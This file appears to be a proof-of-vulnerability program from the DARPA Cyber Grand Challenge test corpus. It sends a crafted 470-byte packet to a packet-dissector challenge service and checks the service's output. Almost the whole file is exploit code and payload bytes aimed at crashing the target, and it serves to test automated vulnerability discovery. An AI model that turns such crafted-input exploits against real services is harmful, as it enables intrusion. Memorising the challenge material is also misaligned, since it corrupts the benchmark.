#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xd6\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xbe\x01\x00\x00\xb6\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xb6\x01\x00\x00"
         "\xd8\x67\x32\x01\x50\x89\x3d\x28\x26\xc9\xe1\x4d\x3e\xea\xbd\x26"
         "\xb5\x21\x7f\xd0\x19\x00\x00\x00\x01\xfc\x28\xc0\x50\xf4\xe2\xde"
         "\x4d\x4a\x16\x27\xe5\x16\x44\x45\x4c\x4e\x01\x00\xb5\x01\x00\x63"
         "\x01\x21\x45\xa7\x01\x8a\x01\x00\x0f\xc3\x17\x8c\x13\x12\x05\x37"
         "\x70\x01\x00\xf3\x41\x00\x31\x79\xf0\xa8\x18\x50\xff\xff\x6e\xfc"
         "\x07\x2b\x41\x6d\x67\xc3\x79\xde\x9e\xac\xd2\x6f\xd6\x9f\x01\x8f"
         "\x89\xf3\x93\x51\x01\x00\x51\x80\x29\x98\x27\x17\xa5\x2b\x30\x41"
         "\x00\xff\x6e\x26\xe3\x5c\x8a\xfe\x05\x47\x41\x00\x01\x23\xba\x03"
         "\x01\x78\xc6\x14\x41\x00\xc7\xd7\xc9\xb5\x01\xe6\x01\x57\x01\x00"
         "\x67\x01\xb7\x41\x00\x41\x00\xe4\x6a\x61\x4a\x72\x90\x67\xd1\xbe"
         "\xd1\x01\x00\xb4\x41\x00\x6e\x56\x0f\xd0\x13\xc0\xf5\x0b\xff\x88"
         "\x96\xa9\x9d\x6e\x19\xf2\x9a\x39\xf0\x81\x97\x46\x82\xd4\x4a\x03"
         "\xef\x86\x23\x6d\xfe\x14\x0a\x4e\xa2\xa1\x96\xe1\x41\xb4\xff\xc3"
         "\xad\xfe\x28\x34\x84\xc7\x76\x6c\x4f\xa5\x4b\xf6\x3e\xdd\xaa\xc4"
         "\x50\x6c\x75\x6f\x49\x8f\x25\x97\x0c\x6a\xe0\xde\xc9\x60\x10\x2f"
         "\xba\xf6\x9e\x5c\x3b\x1f\xcb\xc0\x55\x19\xf4\x5a\x7b\x85\xce\xf2"
         "\xdf\x61\x01\x6c\xa3\x75\x0b\xb3\x3a\x93\x0b\x3f\xfc\x94\x34\x8a"
         "\x49\x92\x96\x2f\xa1\x6b\x0e\xec\x3d\x07\xd6\xde\x14\xaf\x6f\x22"
         "\x05\xa8\xd8\x02\x3b\xf6\xff\xdc\x1b\x6b\xf7\xc2\xc7\x26\xeb\x8c"
         "\x84\xff\x4d\x08\x77\x54\x59\xfe\x02\xc2\x68\xf2\x3f\x6e\x71\x2f"
         "\x1c\x91\xe1\xe6\x58\x7b\x2a\x15\x6e\xd7\xac\x86\x61\x39\xde\x01"
         "\x44\x09\xa8\x0b\x2d\x17\xc4\x1e\x49\x55\xd2\x5e\xe3\xe3\x4d\xcb"
         "\x9a\xae\xe5\xe5\x6a\x45\x66\x08\x13\x0f\x0c\x3c\x8d\xf9\xf1\xfc"
         "\x8e\x66\x4b\xe6\xe5\xc3\xd7\x0a\x6b\x2d\x34\x21\x7e\x7c\xd2\x7d"
         "\x2d\x96\x96\x71\x7b\x0e\x0d\x96\x34\x70\x7d\xc1\x4e\x41\xc6\xc2"
         "\x02\xfe\x39\x60\x0c\xb2\xc1\x71\xd4\xd2\x91\x32\x74\x44\xe2\x52"
         "\x6d\xfc\x51\xa2\xa1\x6c\x6a\xed\xe3\x90\xaa\x42\xb3\xe5\x9e\xe6"
         "\xf8\xcb\x39\x26\x0e\x74";
      static unsigned int write_00001_00000_len = 470;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamamarket
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x6d\x61\x72\x6b\x65\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
